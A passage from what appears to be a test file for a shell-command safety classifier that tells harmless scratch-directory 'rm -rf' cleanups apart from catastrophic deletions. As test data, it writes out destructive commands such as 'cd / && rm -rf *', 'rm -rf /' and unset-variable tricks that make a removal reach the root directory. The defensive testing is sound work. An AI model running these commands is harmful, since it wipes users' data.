    "A=/home/user/.cache/tmp/proj/scratchpad/act; rm -rf $A/actions $A/actions-per-job; mv $A/logs/a.log $A/logs/b.log",
    "B=/userdata/build/rk5; cd /userdata/src; rm -rf $B/src-rk4; git worktree add -q --detach $B/src-rk4 v1",
    "D=/home/user/.cache/tmp/proj/scratchpad/dmaheap; rm -rf $D/mock; cat > /tmp/w.sh <<EOF\nuntil grep -q x $D/build.log; do sleep 5; done\nEOF",
    "S=/home/user/.cache/tmp/x/scratchpad && rm -rf $S/root && mkdir -p $S/root/data && python3 - <<EOF\nprint('$S/root')\nEOF",
    'SP="$HOME/.cache/tmp/x/scratchpad"; rm -rf "$SP/e2e-run" "$SP/migrate-run" "$SP/qa18"',
    'S=/home/user/.cache/tmp/x/scratchpad; rm -rf "$S"/pkg.Yw67 "$S"/cfg.JuVt 2>/dev/null; ls "$S"',
    'O=/home/user/.cache/tmp/x/scratchpad/out; rm -rf -- "$O/k" "$O/k-pr"',
    "W=/home/user/wt; cd $W/repo && rm -rf $W/dist || rm -rf $W/dist",
    "S=/home/user/.cache/tmp/x; rm -rf $S/target-* 2>&1 | tail -1",
    "S=/home/user/.cache/tmp/x; (fl=$S/flag; rm -rf $S/logs; echo $fl) &",
    "S=/home/user/.cache/tmp/x; git -C $S/repo log -1; rm -rf $S/repo $S/h",
    'S=/home/user/.cache/tmp/x; rm -rf "$S/kbuild" "$S/ubuild" \\\n  "$S/prs"',
    "cd /home/user/.cache/tmp/x/scratchpad/proj && rm -rf ./* 2>/dev/null",
    "T=$(mktemp -d); git clone -q . $T/clone && rm -rf $T",
    "S=/home/user/.cache/tmp/x\nfor r in a b; do rm -rf $S/run-$r; done\nls $S",
  ])("%s runs", (command) => runs(command, SESSION));
});

describe("text that only looks like an assignment or a cd", () => {
  const HOME_SESSION = bashIn({ platform: "linux", home: "/home/u", cwd: "/home/u/proj", root: "/home/u/proj" });
  const kindOf = (command: string) => classify(command, HOME_SESSION)?.kind ?? "none";

  test.each([
    "cat <<EOF\nS=/home/u/x\nEOF\nrm -rf $S/y",
    "cat <<'EOF'\nS=/home/u/x\nEOF\nrm -rf $S/y",
    'cat <<"EOF"\nS=/home/u/x\nEOF\nrm -rf $S/y',
    "cat <<-EOF\n\tS=/home/u/x\n\tEOF\nrm -rf $S/y",
    "cat <<A <<B\nx\nA\nS=/home/u/x\nB\nrm -rf $S/y",
    "cat <<EOF > notes && rm -rf $S/y\nS=/home/u/x\nEOF",
    'cat <<< "S=/home/u/x"; rm -rf $S/y',
    'git commit -m "msg\nS=/home/u/x\n"\nrm -rf $S/y',
    "echo 'S=/home/u/x'; rm -rf $S/y",
    "f() {\n  S=/home/u/x\n}\nrm -rf $S/y",
    "(S=/home/u/x); rm -rf $S/y",
    "if c; then S=/home/u/x; fi; rm -rf $S/y",
  ])("%s leaves S unset, so the removal reaches /y", (command) => expect(kindOf(command)).toBe("catastrophic"));

  test.each(["cd .. && rm -rf *", "cd && rm -rf *", "cd ~ && rm -rf *", "cd / && rm -rf *"])("%s empties a protected directory", (command) =>
    expect(kindOf(command)).toBe("catastrophic"),
  );

  test.each([
    "S=/home/u/x; rm -rf $S/y",
    "cd /home/u/proj/build && rm -rf *",
    "S=/home/u/x\ncat <<EOF\nS=\nEOF\nrm -rf $S/y",
    "cat <<EOF\n$(S=/home/u/x; rm -rf $S/y)\nEOF",
    "bash <<'EOF'\nS=/home/u/x; rm -rf $S/y\nEOF",
  ])("%s runs", (command) => expect(kindOf(command)).toBe("removal"));

  test("a removal written inside a quoted heredoc that cat saves is not run", () =>
    expect(kindOf("cat <<'EOF' > clean.sh\nrm -rf /\nEOF")).toBe("none"));
});
